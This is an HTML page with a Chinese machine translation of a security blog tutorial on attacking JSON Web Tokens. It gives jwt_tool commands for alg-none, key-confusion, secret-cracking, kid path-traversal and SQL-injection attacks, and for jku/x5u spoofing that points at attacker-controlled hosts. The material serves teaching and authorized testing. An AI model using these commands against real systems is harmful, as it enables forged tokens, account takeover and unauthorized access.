<html>
<head>
<title>Attacking JSON Web Tokens (JWTs)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">攻击JSON Web令牌(jwt)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/attacking-json-web-tokens-jwts-d1d51a1e17cb?source=collection_archive---------0-----------------------#2020-11-09">https://infosecwriteups.com/attacking-json-web-tokens-jwts-d1d51a1e17cb?source=collection_archive---------0-----------------------#2020-11-09</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="fd78" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">伪造令牌获得未经授权的访问！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/9e9c99f20cba8360fdf310efd19cbdc3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DmfpQMhCd9FY2DYJk2DOJg.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">我做的:)</figcaption></figure><p id="8839" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">JSON Web Token通常用于授权，其紧凑形式由三个元素组成:</p><ol class=""><li id="d531" class="lb lc iq jp b jq jr ju jv jy ld kc le kg lf kk lg lh li lj bi translated">页眉</li><li id="32ff" class="lb lc iq jp b jq lk ju ll jy lm kc ln kg lo kk lg lh li lj bi translated">有效载荷</li><li id="7ec8" class="lb lc iq jp b jq lk ju ll jy lm kc ln kg lo kk lg lh li lj bi translated">签名</li></ol><h2 id="29a2" class="lp lq iq bd lr ls lt dn lu lv lw dp lx jy ly lz ma kc mb mc md kg me mf mg mh bi translated">页眉</h2><p id="c358" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">这是一个JSON对象，它是令牌的元数据，主要用于定义其类型，算法名称用于签署<strong class="jp ir">签名</strong>，如“HS256”、“RS256”等。以及其他参数，如“kid”、“jku”、“x5u”等。</p><h2 id="1c5b" class="lp lq iq bd lr ls lt dn lu lv lw dp lx jy ly lz ma kc mb mc md kg me mf mg mh bi translated">有效载荷</h2><p id="fb73" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">这也是一个JSON对象，用于存储用户信息，如id、用户名、角色、令牌生成时间和其他自定义声明。</p><h2 id="98e3" class="lp lq iq bd lr ls lt dn lu lv lw dp lx jy ly lz ma kc mb mc md kg me mf mg mh bi translated">签名</h2><p id="cc18" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">这是最重要的部分，因为它通过对Base64-URL编码的标头和有效负载进行签名来决定令牌的完整性。)用秘钥。例如，要使用HS256算法生成令牌，伪代码如下所示:</p><pre class="km kn ko kp gt mn mo mp mq aw mr bi"><span id="f9cc" class="lp lq iq mo b gy ms mt l mu mv">// Use Base64-URL algorithm for encoding and concatenate with a dot</span><span id="0ac7" class="lp lq iq mo b gy mw mt l mu mv"><strong class="mo ir">data = (base64urlEncode(header) + '.' + base64urlEncode(payload))</strong></span><span id="4d56" class="lp lq iq mo b gy mw mt l mu mv">// Use HS256 algorithm with "SECRET_KEY" string as a secret</span><span id="89f2" class="lp lq iq mo b gy mw mt l mu mv"><strong class="mo ir">signature = HMACSHA256(data , SECRET_KEY)</strong></span><span id="55ab" class="lp lq iq mo b gy mw mt l mu mv">// Complete token<br/><strong class="mo ir">JWT = data + "." + base64UrlEncode(signature)</strong></span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mx"><img src="../Images/cadaabd16d0c35ca5aab24618af233d1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9oYeFviIjMqQV_lty8-6FQ.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">以“SECRET_KEY”作为秘密的有效HS256签名令牌</figcaption></figure><h2 id="8eb6" class="lp lq iq bd lr ls lt dn lu lv lw dp lx jy ly lz ma kc mb mc md kg me mf mg mh bi translated">但是什么是秘密钥匙呢？</h2><p id="5f4b" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">一般来说，JWT可以通过两种加密机制生成，即对称加密和非对称加密。</p><p id="300a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">对称:</strong></p><p id="7330" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这种机制需要一个密钥来创建和验证JWT。</p><p id="5eed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">例如，如果Bob用“h1dden_messag3”作为密钥生成了一个JWT，那么任何知道该密钥(即h1dden_messag3)的人都可以使用该密钥修改令牌，并且该令牌仍然有效。这样他们就可以冒充任何用户。这种类型最常见的算法是HS256。</p><p id="f753" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">不对称:</strong></p><p id="5cf3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该机制需要一个用于验证的<strong class="jp ir">公钥</strong>和一个用于签名的<strong class="jp ir">私钥</strong>。</p><p id="5b7c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">例如，如果Bob使用了这种加密，那么他是唯一可以使用私钥创建新令牌的人，而Alice只能使用公钥验证令牌，但不能修改它。这种类型最常见的算法是RS256。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi my"><img src="../Images/a257ca7aaa78dc65ac650677929b030c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GyO1z0_6N_ezW62aWFdgsA.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">用RS256算法签名的有效令牌</figcaption></figure></div><div class="ab cl mz na hu nb" role="separator"><span class="nc bw bk nd ne nf"/><span class="nc bw bk nd ne nf"/><span class="nc bw bk nd ne"/></div><div class="ij ik il im in"><h2 id="a221" class="lp lq iq bd lr ls lt dn lu lv lw dp lx jy ly lz ma kc mb mc md kg me mf mg mh bi translated">现在有趣的部分开始了！</h2><p id="eb7e" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">如上所述，为了伪造令牌，必须有正确的密钥(例如，用于HS256的秘密密钥，用于RS256的公共和私人密钥)，但是如果JWT的配置没有正确实现，那么有许多方法可以绕过控制并修改令牌以获得未授权的访问。</p><h1 id="1ece" class="ng lq iq bd lr nh ni nj lu nk nl nm lx nn no np ma nq nr ns md nt nu nv mg nw bi translated">基本攻击</h1><blockquote class="nx ny nz"><p id="7b70" class="jn jo oa jp b jq jr js jt ju jv jw jx ob jz ka kb oc kd ke kf od kh ki kj kk ij bi translated"><em class="iq">为了执行所有这些攻击，我将使用</em><a class="ae oe" href="https://github.com/ticarpi/jwt_tool/" rel="noopener ugc nofollow" target="_blank"><em class="iq">JWT _工具</em> </a> <em class="iq">，你可以使用这个</em> <a class="ae oe" href="https://github.com/h-a-c/jwt-lab" rel="noopener ugc nofollow" target="_blank"> <em class="iq">实验室</em> </a>来练习它们</p></blockquote><h2 id="f8ad" class="lp lq iq bd lr ls lt dn lu lv lw dp lx jy ly lz ma kc mb mc md kg me mf mg mh bi translated"><strong class="ak"> 1。无算法</strong></h2><p id="35e4" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">如果应用程序无法验证<strong class="jp ir">【alg】</strong>报头的<strong class="jp ir"> </strong>值，那么我们可以将其值更改为<strong class="jp ir">【无】</strong>，这样就不需要有效的签名进行验证。例如:</p><pre class="km kn ko kp gt mn mo mp mq aw mr bi"><span id="799c" class="lp lq iq mo b gy ms mt l mu mv">// Modified Header of JWT after changing the "alg" parameter</span><span id="7522" class="lp lq iq mo b gy mw mt l mu mv">{<br/>  "alg": "none",<br/>  "typ": "JWT"<br/>}</span></pre><p id="1578" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">命令:</p><pre class="km kn ko kp gt mn mo mp mq aw mr bi"><span id="976b" class="lp lq iq mo b gy ms mt l mu mv">python3 jwt_tool.py &lt;JWT&gt; -X a</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi of"><img src="../Images/e3990a988d63717563e6f2568b8fe9aa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZMjVGUrbbHPbFIE4IGUt6Q.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">无算法攻击</figcaption></figure><p id="5a8b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里，jwt_tool创建了不同的有效负载来利用这个漏洞，并通过省略签名部分来绕过所有限制。</p><h2 id="33d3" class="lp lq iq bd lr ls lt dn lu lv lw dp lx jy ly lz ma kc mb mc md kg me mf mg mh bi translated">2.<strong class="ak">将算法从RS256更改为HS256 </strong></h2><p id="b1e2" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">如上所述，RS256算法需要一个私钥来篡改数据，还需要一个相应的公钥来验证签名的真实性。但是，如果我们能够将签名算法从RS256更改为HS256，我们将强制应用程序只使用一个密钥来完成这两项任务，这是<strong class="jp ir"> HMAC </strong>算法的正常行为。</p><p id="95bf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，通过这种方式，工作流将从非对称加密转换为对称加密，现在我们可以使用相同的公钥对新令牌进行签名。</p><p id="ec1f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">命令:</p><pre class="km kn ko kp gt mn mo mp mq aw mr bi"><span id="a52e" class="lp lq iq mo b gy ms mt l mu mv">python3 jwt_tool.py &lt;JWT&gt; -S hs256 -k public.pem</span></pre><p id="a213" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里，我首先从应用程序下载了公钥(public.pem ),然后使用该密钥使用HS256算法对令牌进行签名。通过这种方式，我们可以生成新的令牌，并可以在任何现有的声明中注入有效负载。</p><h2 id="b541" class="lp lq iq bd lr ls lt dn lu lv lw dp lx jy ly lz ma kc mb mc md kg me mf mg mh bi translated">3.<strong class="ak">签名未被检查</strong></h2><p id="2a69" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">有时，当模糊头和有效负载部分中的数据时，如果应用程序没有返回错误，则意味着签名在授权服务器签名后没有被验证。这样，我们可以在声明中注入任何有效负载，令牌将始终有效。</p><p id="0fa8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">命令:</p><pre class="km kn ko kp gt mn mo mp mq aw mr bi"><span id="88c9" class="lp lq iq mo b gy ms mt l mu mv">python3 jwt_tool.py &lt;JWT&gt; -I -pc name -pv admin</span></pre><p id="3df1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里没有检查签名部分，因此我可以修改有效负载部分中的“name”声明，变成“admin”</p><h2 id="f86a" class="lp lq iq bd lr ls lt dn lu lv lw dp lx jy ly lz ma kc mb mc md kg me mf mg mh bi translated">4.<strong class="ak">破解密钥</strong></h2><p id="159c" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">我们可以通过诸如LFI、XXE、SSRF等漏洞获得密钥文件。但是，如果这是不可能的，那么仍然可以进行其他攻击来检查令牌是否使用任何弱秘密字符串进行加密。</p><blockquote class="nx ny nz"><p id="bc3e" class="jn jo oa jp b jq jr js jt ju jv jw jx ob jz ka kb oc kd ke kf od kh ki kj kk ij bi translated">为此，一个名为<a class="ae oe" href="https://github.com/wallarm/jwt-heartbreaker" rel="noopener ugc nofollow" target="_blank"> <em class="iq"> JWT心碎者</em> </a>的BurpSuite扩展可能会有用。</p></blockquote><p id="d731" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这种暴露会危及整个安全机制，因为现在我们可以用秘密密钥生成任意令牌。</p><p id="cfb3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是要确保我们得到的字符串是不是真正的SECRET_KEY呢？我们可以使用jwt_tool的Crack特性。</p><p id="6922" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">命令:</p><pre class="km kn ko kp gt mn mo mp mq aw mr bi"><span id="b71a" class="lp lq iq mo b gy ms mt l mu mv"><strong class="mo ir">python3 jwt_tool.py &lt;JWT&gt; -C -d secrets.txt <br/>// </strong>Use -p flag for a string</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi og"><img src="../Images/1b25bea43f6ff1c8bdd9e48f63f915c7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*91yGKACzUtFrNlvM78C4cg.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">破解有效密钥并签署新令牌</figcaption></figure><h2 id="7c3a" class="lp lq iq bd lr ls lt dn lu lv lw dp lx jy ly lz ma kc mb mc md kg me mf mg mh bi translated"><strong class="ak"> 5。使用任意文件验证</strong></h2><p id="6c84" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">密钥ID (kid)是具有字符串类型的可选报头，用于指示文件系统或数据库中存在的特定密钥，然后使用其内容来验证签名。如果应用程序有多个用于对令牌进行签名的密钥，则此参数很有用，但是如果它是可注入的，则可能很危险，因为攻击者可以指向内容可预测的特定文件。</p><p id="5110" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">例如，<strong class="jp ir"> "/dev/null" </strong>被称为空设备文件，并且总是不返回任何内容，因此它可以在基于Unix的系统中完美地工作。</p><p id="bd36" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">命令:</p><pre class="km kn ko kp gt mn mo mp mq aw mr bi"><span id="046f" class="lp lq iq mo b gy ms mt l mu mv">python3 jwt_tool.py &lt;JWT&gt; -I -hc kid -hv "../../dev/null" -S hs256 -p ""</span></pre><p id="48e3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">或者，您可以使用web根目录中的任何文件，如CSS或JS，并使用其内容来验证签名。</p><blockquote class="nx ny nz"><p id="270c" class="jn jo oa jp b jq jr js jt ju jv jw jx ob jz ka kb oc kd ke kf od kh ki kj kk ij bi translated"><em class="iq">这个挑战的另一个解决方案:</em></p></blockquote><p id="32ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">命令:</p><pre class="km kn ko kp gt mn mo mp mq aw mr bi"><span id="ef9e" class="lp lq iq mo b gy ms mt l mu mv">python3 jwt_tool.py -I -hc kid -hv "path/of/the/file" -S hs256 -p "Content of the file"</span></pre></div><div class="ab cl mz na hu nb" role="separator"><span class="nc bw bk nd ne nf"/><span class="nc bw bk nd ne nf"/><span class="nc bw bk nd ne"/></div><div class="ij ik il im in"><h1 id="4043" class="ng lq iq bd lr nh oh nj lu nk oi nm lx nn oj np ma nq ok ns md nt ol nv mg nw bi translated">高级攻击</h1><h2 id="602a" class="lp lq iq bd lr ls lt dn lu lv lw dp lx jy ly lz ma kc mb mc md kg me mf mg mh bi translated"><strong class="ak"> 1。SQL注入</strong></h2><p id="756c" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">如果从数据库中检索某些值的任何参数未得到正确清理，就会发生此漏洞。最近，我用这个技巧解决了一个CTF挑战。</p><p id="a489" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">应用程序使用RS256算法，但是公钥在有效载荷部分的<strong class="jp ir"> "pk" </strong>声明中是可见的，因此我能够将签名算法转换为HS256，并被允许创建新的令牌。</p><p id="ac97" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">枚举列数的命令:</p><pre class="km kn ko kp gt mn mo mp mq aw mr bi"><span id="273d" class="lp lq iq mo b gy ms mt l mu mv"><strong class="mo ir">python3 jwt_tool.py &lt;JWT&gt; -I -pc name -pv "imparable' ORDER BY 1--" -S hs256 -k public.pem</strong></span><span id="157e" class="lp lq iq mo b gy mw mt l mu mv">// Increment the value by 1 until an error will occur</span></pre><h2 id="95f5" class="lp lq iq bd lr ls lt dn lu lv lw dp lx jy ly lz ma kc mb mc md kg me mf mg mh bi translated">2.<strong class="ak">伪造表头参数</strong></h2><p id="75e2" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">JSON Web密钥集(JWKS)是一组用于令牌验证的公共密钥。这里有一个例子:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi om"><img src="../Images/06ab1fc8ce5e91136d77cf21d0ac7501.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AsW6Wkr13oniKdt-9r9fWA.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">JWKS中的公钥</figcaption></figure><p id="c3eb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该文件存储在可信服务器中，应用程序可以通过<strong class="jp ir">“jku”</strong>和<strong class="jp ir">“x5u”</strong>头参数指向该文件，但是如果我们能够通过Open redirect、在主机名后添加@符号等技巧来操作URL。</p><p id="8a52" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我们可以将应用程序重定向到我们的恶意服务器，而不是可信服务器，这样我们就可以生成新的令牌，因为公钥和私钥都由我们控制。</p><ul class=""><li id="f990" class="lb lc iq jp b jq jr ju jv jy ld kc le kg lf kk on lh li lj bi translated"><strong class="jp ir"> JSON集合URL (jku): </strong></li></ul><p id="01d1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该参数指向一组JSON编码格式的公钥(JWKS中的属性<strong class="jp ir"> n </strong>和<strong class="jp ir"> e </strong>),在工具安装后第一次运行时,“jwt_tool”自动为该攻击生成名为<em class="oa">“jwt tool _ custom _ JWKS . JSON”</em>的JWKS文件。</p><p id="9bf1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">命令:</p><pre class="km kn ko kp gt mn mo mp mq aw mr bi"><span id="90f0" class="lp lq iq mo b gy ms mt l mu mv">python3 jwt_tool.py &lt;JWT&gt; -X s -ju "https://attacker.com/jwttool_custom_jwks.json"</span></pre><ul class=""><li id="430e" class="lb lc iq jp b jq jr ju jv jy ld kc le kg lf kk on lh li lj bi translated"><strong class="jp ir"> X.509 URL (x5u): </strong></li></ul><p id="7821" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该参数指向X.509公钥证书或证书链(JWKS中的属性<strong class="jp ir"> x5c </strong>)，您可以使用相应的私钥生成该证书，如下所示:</p><pre class="km kn ko kp gt mn mo mp mq aw mr bi"><span id="6550" class="lp lq iq mo b gy ms mt l mu mv">openssl req -newkey rsa:2048 -nodes -keyout private.pem -x509 -days 365 -out attacker.crt -subj "/C=AU/L=Brisbane/O=CompanyName/CN=pentester"</span></pre><p id="60c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里使用OpenSSL，在“attacker.crt”中创建证书，现在可以将它嵌入到带有“x5c”属性的JWKS文件中，并且可以像这样利用它:</p><p id="ac5f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">命令:</p><pre class="km kn ko kp gt mn mo mp mq aw mr bi"><span id="88a1" class="lp lq iq mo b gy ms mt l mu mv">python3 jwt_tool.py &lt;JWT&gt; -S rs256 -pr private.pem -I -hc x5u -hv "<a class="ae oe" href="http://victim.com@ccbfd9f5afa7.ngrok.io/x5c.json" rel="noopener ugc nofollow" target="_blank">https://attacker.com/custom_x5u.json</a>"</span></pre><blockquote class="nx ny nz"><p id="5169" class="jn jo oa jp b jq jr js jt ju jv jw jx ob jz ka kb oc kd ke kf od kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="iq">注:</em> </strong>免费托管您的文件，您可以使用<a class="ae oe" href="https://repl.it" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir"><em class="iq">【REPL】。它</em> </strong> </a> <em class="iq">😃</em></p></blockquote><ul class=""><li id="3fa0" class="lb lc iq jp b jq jr ju jv jy ld kc le kg lf kk on lh li lj bi translated"><strong class="jp ir">嵌入式公钥:</strong></li></ul><p id="d24d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果服务器通过<strong class="jp ir"> "jwk" </strong> (JSON Web Key)或<strong class="jp ir"> "x5c" </strong> (X.509证书链)参数将公钥直接嵌入令牌，那么尝试用您自己的公钥替换它们，并用相应的私钥对令牌进行签名。</p><h2 id="6290" class="lp lq iq bd lr ls lt dn lu lv lw dp lx jy ly lz ma kc mb mc md kg me mf mg mh bi translated">3.<a class="ae oe" href="https://portswigger.net/kb/issues/00200200_http-response-header-injection" rel="noopener ugc nofollow" target="_blank"> HTTP响应头注入</a></h2><p id="b5ad" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">假设如果应用程序在“jku”或“x5c”参数中限制任何操作的URL，那么我们可以使用响应头注入漏洞在HTTP响应中添加内联jwk，并强制应用程序使用它进行签名验证。</p><p id="4b3a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了演示这种攻击，我写了一个Python脚本，可以在这里找到<a class="ae oe" href="https://gist.github.com/imparabl3/efcf4a991244b9f8f99ac39a7c8cfe6f" rel="noopener ugc nofollow" target="_blank">。</a></p><h2 id="cd73" class="lp lq iq bd lr ls lt dn lu lv lw dp lx jy ly lz ma kc mb mc md kg me mf mg mh bi translated">4.其他问题</h2><p id="94e3" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">JSON Web令牌是另一种形式的用户输入，所有的参数都必须进行适当的清理，否则可能会导致LFI、RCE等漏洞。但是这并不意味着应用程序仍然是安全的。</p><p id="3ed6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为如果一个攻击者不能伪造jwt，那么他就会试图用XSS，CSRF，CORS的错误配置来窃取它们。更多信息可在<a class="ae oe" href="https://github.com/ticarpi/jwt_tool/wiki/Stealing-JWTs" rel="noopener ugc nofollow" target="_blank">这里</a>找到。</p></div><div class="ab cl mz na hu nb" role="separator"><span class="nc bw bk nd ne nf"/><span class="nc bw bk nd ne nf"/><span class="nc bw bk nd ne"/></div><div class="ij ik il im in"><h1 id="c5b6" class="ng lq iq bd lr nh oh nj lu nk oi nm lx nn oj np ma nq ok ns md nt ol nv mg nw bi translated">结束语</h1><p id="70af" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">请只在法律允许的系统上测试这些攻击，否则你可能会坐牢😎</p><p id="871b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">玩笑归玩笑，如果你觉得这篇文章有帮助，请给我你的反馈，你可以在Twitter @nehatarick上找到我</p><p id="b6f1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">祝圣灵降临节快乐！</p></div></div>    
</body>
</html>